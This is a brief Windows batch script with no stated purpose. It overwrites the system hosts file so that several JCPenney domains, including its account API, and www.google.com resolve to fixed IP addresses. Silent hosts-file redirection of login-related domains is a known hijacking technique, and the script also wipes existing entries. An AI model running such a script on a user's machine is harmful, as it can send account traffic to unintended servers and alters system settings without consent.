@echo off
(echo 72.247.152.138 www.jcpenney.com
echo 72.247.152.138 account-api.jcpenney.com
echo 72.247.152.138 m.jcpenney.com
echo 162.222.75.243 www.google.com) > %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts